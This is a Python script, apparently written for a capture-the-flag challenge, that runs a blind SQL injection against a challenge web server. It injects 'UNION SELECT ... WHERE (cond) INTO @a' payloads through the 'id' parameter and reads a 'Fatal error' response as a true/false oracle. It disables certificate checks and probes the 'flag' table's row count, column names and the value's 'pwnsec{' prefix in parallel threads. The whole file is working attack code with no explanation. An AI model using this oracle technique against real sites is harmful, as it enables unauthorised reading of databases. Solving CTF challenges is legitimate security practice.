import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()
url = "https://04a2b0dcb17c2e99.chal.ctf.ae/"

def oracle(cond):
    s = requests.Session()
    s.verify = False
    p = f"1 UNION SELECT 2 WHERE ({cond}) INTO @a"
    try:
        r = s.get(url, params={"id": p}, timeout=10)
        return "Fatal error" not in r.text
    except Exception as e:
        return False

tests = [
    ("flag row count = 1", "(SELECT COUNT(*) FROM flag)=1"),
    ("flag row count = 2", "(SELECT COUNT(*) FROM flag)=2"),
    ("flag col 'flag' exists", "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='flag' AND column_name='flag')>0"),
    ("flag col 'value' exists", "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='flag' AND column_name='value')>0"),
    ("flag col count = 1", "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='flag')=1"),
    ("flag starts with 'pwnsec{'", "(SELECT flag FROM flag LIMIT 1) LIKE 'pwnsec{%'"),
]

with ThreadPoolExecutor(max_workers=8) as ex:
    futures = [(name, ex.submit(oracle, cond)) for name, cond in tests]
    for name, f in futures:
        print(f"{name:35} : {f.result()}")
